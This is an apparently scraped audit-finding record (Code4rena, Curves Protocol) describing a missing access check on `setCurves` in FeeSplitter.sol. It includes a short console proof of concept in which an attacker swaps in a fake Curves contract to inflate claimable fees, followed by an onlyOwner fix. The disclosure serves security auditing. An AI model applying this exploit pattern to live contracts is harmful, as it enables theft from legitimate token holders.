---
# Core Classification
protocol: Curves Protocol
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 35080
audit_firm: Code4rena
contest_link: https://code4rena.com/reports/2024-01-curves
source_link: https://code4rena.com/reports/2024-01-curves
github_link: https://github.com/code-423n4/2024-01-curves-findings/issues/4

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 178
finders:
  - Soul22
  - 0xAadi
  - zhaojohnson
  - jasonxiale
  - Inspex
---

## Vulnerability Title

[H-04] Unauthorized Access to `setCurves` Function

### Overview


The `FeeSplitter.sol` contract has a security vulnerability that allows any user to update the reference to the `Curves` contract. This can be exploited by a malicious user to manipulate critical calculations used in fee distribution and claim unauthorized profit. A proof of concept is provided, along with recommended mitigation steps to restrict the `setCurves` function to only be callable by the owner or a trusted manager.

### Original Finding Content


The `FeeSplitter.sol` contract, which is responsible for fee distribution and claiming, contains a significant security vulnerability related to the `setCurves` function. This function allows updating the reference to the `Curves` contract. However, as it currently stands, any user, including a malicious actor, can call `setCurves`. This vulnerability can be exploited to redirect the contract's reference to a fake or malicious `Curves` contract (`FakeCurves.sol`), enabling manipulation of critical calculations used in fee distribution.

The exploit allows an attacker to set arbitrary values for `curvesTokenBalance` and `curvesTokenSupply` in the fake `Curves` contract. By manipulating these values, the attacker can falsely inflate their claimable fees, leading to unauthorized profit at the expense of legitimate token holders.

### Proof of Concept

**Steps:**

1. Deploy the `FeeSplitter` and `FakeCurves` contracts.
2. As an attacker, call `setCurves` on `FeeSplitter` to update the `curves` reference to the deployed `FakeCurves` contract.
3. Manipulate `curvesTokenBalance` and `curvesTokenSupply` in `FakeCurves` to create false balances and supplies.
4. Call `getClaimableFees` in `FeeSplitter` to calculate inflated claimable fees based on the manipulated values.
5. Observe that the attacker is able to claim fees that they are not entitled to.

**Code:**

```python
>>> feeRedistributor.getClaimableFees(randomToken, attacker)
0
>>> feeRedistributor.setCurves(fakeCurves,{'from': attacker})
Transaction sent: 0x6480994a739ab1541d4eb596fd73a49d55b59b6c7080a7cbb10d0b72f619b799
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 9
  FeeSplitter.setCurves confirmed   Block: 17   Gas used: 27607 (0.23%)

<Transaction '0x6480994a739ab1541d4eb596fd73a49d55b59b6c7080a7cbb10d0b72f619b799'>
>>> fakeCurves.setCurvesTokenSupply(randomToken, 250, {'from': attacker})
Transaction sent: 0xd9c0938f9876348657bf5ef8e7e84706b0ddf287da69169716ca6af22a3c059d
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 10
  FakeCurves.setCurvesTokenSupply confirmed   Block: 18   Gas used: 22786 (0.19%)

<Transaction '0xd9c0938f9876348657bf5ef8e7e84706b0ddf287da69169716ca6af22a3c059d'>
>>> fakeCurves.setCurvesTokenBalance(randomToken, attacker, 249, {'from': attacker})
Transaction sent: 0x742b4aac4d03210fc4869a75dd625fdbf52838655f57ddf8e028dfbaa6818932
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 11
  FakeCurves.setCurvesTokenBalance confirmed   Block: 19   Gas used: 23361 (0.19%)

<Transaction '0x742b4aac4d03210fc4869a75dd625fdbf52838655f57ddf8e028dfbaa6818932'>
>>> feeRedistributor.getClaimableFees(randomToken, attacker)
996000000000000000
```

### Recommended Mitigation Steps

To mitigate this vulnerability, the `setCurves` function in `FeeSplitter.sol` should be restricted to be callable only by the owner or a trusted manager. This can be achieved by using the `onlyOwner` or `onlyManager` modifier (from the inherited `Security.sol` contract) in the `setCurves` function.

The modified `setCurves` function should look like this:

```solidity
function setCurves(Curves curves_) public onlyOwner {
    curves = curves_;
}
```

or, if managers are also trusted to perform this action,

```solidity
function setCurves(Curves curves_) public onlyManager {
    curves = curves_;
}
```

**[andresaiello (Curves) confirmed](https://github.com/code-423n4/2024-01-curves-findings/issues/4#issuecomment-1908728504)**

***



### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | Curves Protocol |
| Report Date | N/A |
| Finders | Soul22, 0xAadi, zhaojohnson, jasonxiale, Inspex, ahmedaghadi, 0xSmartContract, Stormreckson, SovaSlava, BowTiedOriole, andywer, 0xPhantom, Avci, 0xblackskull, visualbits, Nikki, polarzero, 0x111, peritoflores, m4ttm, TermoHash, PetarTolev, c0pp3rscr3w3r, Draiakoo, Kose, forkforkdog, Zach\_166, sl1, jacopod, azanux, IceBear, AmitN, kutugu, merlinboii, 0xLogos, Krace, UbiquitousComputing, 0xc0ffEE, 0xMAKEOUTHILL, bigtone, Mj0ln1r, PoeAudits, AlexCzm, hals, XORs33r, ravikiranweb3, Timenov, peanuts, Ryonen, iamandreiski, bbl4de, kodyvim, mahdirostami, haxatron, KingNFT, khramov, alexbabits, jangle, 13u9, dyoff, lil\_eth, EV\_om, Aymen0909, ArsenLupin, LeoGold, parlayan\_yildizlar\_takimi, Oxsadeeq, Inference, dimulski, XDZIBECX, McToady, 0xhashiman, pep7siup, vnavascues, 0xprinc, DMoore, Kong, skyge, The-Seraphs, Timeless, pipoca, cartlex\_, mrudenko, Kaysoft, MrPotatoMagic, ke1caM, KupiaSec, bareli, SpicyMeatball, darksnow, ktg, anshujalan, Soliditors, GhK3Ndf, eeshenggoh, btk, Matue, y4y, mitev, dutra, Berring, Nachoxt17, para8956, Josephdara\_0xTiwa, ivanov, burhan\_khaja, oreztker, salutemada, Prathik3, kodak\_rome, L0s1, nuthan2x, LouisTsai, opposingmonkey, popelev, imare, Arion, DimaKush, baice, VigilantE, iberry, Lef, n1punp, Bobface, FastChecker, whoismatthewmc1, 1, 2, tonisives, jesjupyter, ubl4nk, lukejohn, 0xStalin, codegpt, santipu\_, SanketKogekar, nmirchev8, cats, djxploit, zaevlad, grearlake, 0x11singh99, zxriptor, novodelta, Ephraim, danb, Faith, wangxx2026, klau5, KHOROAMU, rudolph, ether\_sky, alexfilippov314, karanctf, Cosine, bronze\_pickaxe, pipidu83, DanielArmstrong, \_eperezok, kuprum, th13vn, dd0x7e8, 0xNaN, Lirios, spark, spacelord47, Varun\_05, zhaojie, PENGUN, erebus, nonseodion, rouhsamad, Mike\_Bello90, cu5t0mpeo, deepplus, adamn000, 0xMango, nazirite |

### Source Links

- **Source**: https://code4rena.com/reports/2024-01-curves
- **GitHub**: https://github.com/code-423n4/2024-01-curves-findings/issues/4
- **Contest**: https://code4rena.com/reports/2024-01-curves

### Keywords for Search

`vulnerability`

